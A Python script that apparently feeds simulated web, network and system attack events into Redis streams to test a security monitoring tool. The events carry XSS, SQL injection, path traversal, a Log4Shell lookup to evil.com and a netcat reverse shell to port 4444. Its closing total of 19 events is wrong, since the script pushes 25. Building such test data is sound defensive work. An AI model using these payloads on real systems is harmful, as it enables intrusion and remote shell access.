#!/usr/bin/env python3
"""
NeuralOps — Multi-Source Attack Simulator
Pushes simulated web, network, and system events to Redis streams.
"""

import sys, os, json, uuid, time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import redis

r = redis.Redis.from_url("redis://localhost:6379/0", decode_responses=True)

LOG_STREAM = "neuralops:logs"
NET_STREAM = "neuralops:network"
SYS_STREAM = "neuralops:system"

def ts():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

def push(stream, data):
    r.xadd(stream, data, maxlen=10000)
    print(f"  [{stream.split(':')[1]}] {data.get('source','?')} — {data.get('method','') or data.get('protocol','') or data.get('unit','')} {data.get('path','') or data.get('dst_ip','') or data.get('message','')[:50]}")

print("=" * 60)
print("  NEURALOPS — Multi-Source Attack Simulator")
print("=" * 60)
print()

# ── WEB ATTACKS (neuralops:logs) ──────────────────────────────────────────────
print("--- Web Attacks ---")

push(LOG_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "demo-server",
    "source_ip": "198.51.100.42", "method": "GET", "path": "/search",
    "query": "q=<script>alert(1)</script>", "body": "", "status": "200",
    "user_agent": "Mozilla/5.0", "latency_ms": "1.23",
})

push(LOG_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "demo-server",
    "source_ip": "203.0.113.88", "method": "GET", "path": "/products",
    "query": "id=1'+OR+'1'='1", "body": "", "status": "200",
    "user_agent": "sqlmap/1.7", "latency_ms": "0.89",
})

push(LOG_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "demo-server",
    "source_ip": "203.0.113.88", "method": "GET", "path": "/products",
    "query": "id=../../../etc/passwd", "body": "", "status": "200",
    "user_agent": "curl/8.5.0", "latency_ms": "0.76",
})

push(LOG_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "demo-server",
    "source_ip": "45.33.32.156", "method": "GET", "path": "/",
    "query": "", "body": "", "status": "200",
    "user_agent": "${jndi:ldap://evil.com:1389/a}", "latency_ms": "0.56",
})

# Brute force (5 attempts)
for i in range(5):
    push(LOG_STREAM, {
        "id": str(uuid.uuid4()), "timestamp": ts(), "source": "demo-server",
        "source_ip": "192.0.2.15", "method": "POST", "path": "/login",
        "query": "", "body": f"user=admin&passwd=wrong{i}", "status": "401",
        "user_agent": "hydra/9.3", "latency_ms": "0.34",
    })

print()

# ── NETWORK ATTACKS (neuralops:network) ────────────────────────────────────────
print("--- Network Attacks ---")

# Port scan
push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "198.51.100.99", "dst_ip": "10.0.0.1", "dst_port": "22",
    "protocol": "TCP", "flags": "S", "length": "60",
})

push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "198.51.100.99", "dst_ip": "10.0.0.1", "dst_port": "80",
    "protocol": "TCP", "flags": "S", "length": "60",
})

push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "198.51.100.99", "dst_ip": "10.0.0.1", "dst_port": "443",
    "protocol": "TCP", "flags": "S", "length": "60",
})

push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "198.51.100.99", "dst_ip": "10.0.0.1", "dst_port": "3306",
    "protocol": "TCP", "flags": "S", "length": "60",
})

push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "198.51.100.99", "dst_ip": "10.0.0.1", "dst_port": "8080",
    "protocol": "TCP", "flags": "S", "length": "60",
})

# C2 beaconing
push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "10.0.0.55", "dst_ip": "198.51.100.200", "dst_port": "4444",
    "protocol": "TCP", "flags": "PA", "length": "128",
})

push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "10.0.0.55", "dst_ip": "198.51.100.200", "dst_port": "4444",
    "protocol": "TCP", "flags": "PA", "length": "256",
})

push(NET_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "scapy",
    "src_ip": "10.0.0.55", "dst_ip": "198.51.100.200", "dst_port": "4444",
    "protocol": "TCP", "flags": "PA", "length": "512",
})

print()

# ── SYSTEM ATTACKS (neuralops:system) ─────────────────────────────────────────
print("--- System Attacks ---")

# SSH brute force
for i in range(5):
    push(SYS_STREAM, {
        "id": str(uuid.uuid4()), "timestamp": ts(), "source": "journald",
        "unit": "ssh.service", "pid": str(1000 + i),
        "hostname": "web-server-01",
        "message": f"Failed password for root from 198.51.100.99 port 22",
        "priority": "4",
    })

push(SYS_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "journald",
    "unit": "sshd.service", "pid": "2501",
    "hostname": "web-server-01",
    "message": "Accepted publickey for admin from 10.0.0.1 port 22",
    "priority": "5",
})

push(SYS_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "journald",
    "unit": "sudo.service", "pid": "3102",
    "hostname": "web-server-01",
    "message": "admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'nc -e /bin/sh 198.51.100.200 4444'",
    "priority": "3",
})

push(SYS_STREAM, {
    "id": str(uuid.uuid4()), "timestamp": ts(), "source": "journald",
    "unit": "auth.service", "pid": "1822",
    "hostname": "web-server-01",
    "message": "pam_unix(sudo:auth): authentication failure; logname= uid=0 euid=0 tty=pts/0 ruser= rhost=198.51.100.99 user=root",
    "priority": "4",
})

print()
print("=" * 60)
print("  Done! Check neuralops:logs, neuralops:network, neuralops:system")
print(f"  Total: 19 events injected across all 3 streams")
print("=" * 60)
